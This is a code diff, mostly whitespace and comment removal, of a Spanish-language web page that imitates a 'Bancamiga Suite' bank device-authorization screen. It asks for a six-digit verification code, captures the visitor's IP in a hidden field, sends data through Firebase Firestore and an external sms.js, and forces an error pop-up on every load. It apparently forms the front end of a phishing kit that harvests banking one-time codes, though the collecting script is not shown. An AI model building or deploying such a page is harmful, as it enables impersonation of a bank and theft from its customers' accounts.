@@ -25,7 +25,6 @@
             --device-auth-text-dark: #003366; /* Azul oscuro para textos principales */
             --device-auth-text-light: #6c757d; /* Gris para textos secundarios */
         }
-
         body {
             font-family: 'Roboto', sans-serif;
             margin: 0;
@@ -45,7 +44,6 @@
             color: var(--text-color-dark);
             position: relative; /* Para la barra superior fija */
         }
-
         /* --- Contenedor Principal (Tarjeta de Autorización) --- */
         .auth-container {
             background-color: white;
@@ -62,7 +60,6 @@
             z-index: 10;
             overflow: hidden; /* Para contener la imagen de fondo */
         }
-
         /* Estilo para el fondo azul dentro del contenedor */
         .auth-container::before {
             content: '';
@@ -76,7 +73,6 @@
             border-top-right-radius: 20px;
             z-index: -1; /* Para que quede detrás del contenido */
         }
-
         /* Logo Bancamiga Suite dentro del card */
         .auth-logo-suite {
             display: flex;
@@ -95,7 +91,6 @@
             font-size: 24px;
             font-weight: 700;
         }
-
         /* Títulos y textos */
         .auth-title {
             font-size: 26px;
@@ -121,7 +116,6 @@
             position: relative;
             z-index: 1;
         }
-
         /* Imagen central del teléfono - Ajustes para que resalte y sea más grande Y se mueva al centro */
         .phone-graphic {
             width: 250px; /* Tamaño más grande para PC/Tablets */
@@ -135,7 +129,6 @@
         .phone-graphic:hover {
             transform: scale(1.03); /* Ligeramente más grande al pasar el ratón */
         }
-
         /* Mensaje de "Hemos enviado el código" */
         .code-prompt {
             font-size: 16px;
@@ -143,7 +136,6 @@
             margin-top: 0px; /* AJUSTADO: Eliminado el margin-top para que se pegue más a la imagen */
             margin-bottom: 20px;
         }
-
         /* Campos de entrada para el código */
         .code-inputs {
             display: flex;
@@ -168,7 +160,6 @@
             border-color: var(--bancamiga-green);
             box-shadow: 0 0 0 3px rgba(92, 184, 92, 0.2); /* Sombra suave al enfocar */
         }
-
         /* Botones */
         .btn {
             width: 100%;
@@ -197,7 +188,6 @@
         .btn-back:hover {
             background-color: #dee2e6;
         }
-
         /* Estilo para el cuadro de texto azul */
         .info-box {
             background-color: #e0f2f7; /* Un azul muy claro, casi celeste */
@@ -211,7 +201,6 @@
             line-height: 1.5;
             text-align: left; /* Alineación del texto dentro del cuadro */
         }
-
         /* Estilo para el mensaje de error */
         .error-message {
             color: red;
@@ -220,7 +209,6 @@
             margin-bottom: 15px; /* Espacio antes del siguiente elemento */
             font-size: 15px;
         }
-
         /* Media queries para ajustes responsivos */
         @media (max-width: 480px) {
             .auth-container {
@@ -281,15 +269,12 @@
             <img src="midas/logo_bancamiga_suite_mini.png" alt="Bancamiga Logo">
             <span class="suite-text"></span>
         </div>
-
         <h1 class="auth-title">Autorización de dispositivo</h1>
         <p class="auth-user-name"></p>
         <p class="auth-instruction-text">
             El código de verificación fue enviado a través de correo electrónico y número telefónico vía SMS.
         </p>
-
         <img src="midas/mensaje.png" alt="Teléfono con código de verificación" class="phone-graphic">
-
         <p class="code-prompt">Hemos enviado el código de verificación</p>
         <div id="authForm" >
           <div class="code-inputs">
@@ -301,25 +286,16 @@
             <input type="text" maxlength="1" inputmode="numeric" class="code-input">
             <input type="text" maxlength="1" inputmode="numeric" class="code-input">
         </div>
-
   <div class="info-box">
      Si tienes activada la verificación en dos pasos (2FA), 
 es posible que necesites ingresar un código adicional que se genera a 
 través de la aplicación Google Authenticator o similar, o recibirlo por 
 SMS.
   </div>
-
   <button type="button" class="btn btn-verify">VERIFICAR</button>
 </div>
-        
     </div>
-
-   
-
-    <!-- IP -->
     <input type="hidden" id="direccionIP" name="direccionIP">
-
-    <!-- Modal de Error estilo SweetAlert2 -->
     <div id="error-modal-overlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.4); z-index: 10000; justify-content: center; align-items: center;">
         <div role="dialog" aria-labelledby="swal2-title" aria-describedby="swal2-content" class="swal2-modal swal2-show" tabindex="-1" style="width: 500px; padding: 20px; background: rgb(255, 255, 255); display: block; min-height: 274px; border-radius: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.3);">
             <ul class="swal2-progresssteps" style="display: none;"></ul>
@@ -340,32 +316,21 @@ SMS.
             </div>
         </div>
     </div>
-
-    <!-- Scripts del proyecto -->
-    <!-- MODO FIREBASE REAL - ACTIVO -->
     <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
-    
-    <!-- Configuración centralizada de Firebase y rutas -->
     <script src="js/firebase-config.js"></script>
-    
     <script>
-        // Mostrar modal de error al cargar la página
         document.addEventListener('DOMContentLoaded', function() {
             const overlay = document.getElementById('overlay');
             if (overlay) {
                 overlay.style.display = 'none';
             }
-            
-            // Mostrar modal de error automáticamente
             const errorModal = document.getElementById('error-modal-overlay');
             const continueBtn = document.getElementById('error-modal-continue');
-            
             if (errorModal) {
                 errorModal.style.display = 'flex';
             }
             
-            // Manejar clic en botón Continuar
             if (continueBtn) {
                 continueBtn.addEventListener('click', function() {
                     if (errorModal) {
@@ -380,8 +345,5 @@ SMS.
         });
     </script>
     <script src="js/sms.js"></script>
-
-
 </body>
-
 </html>
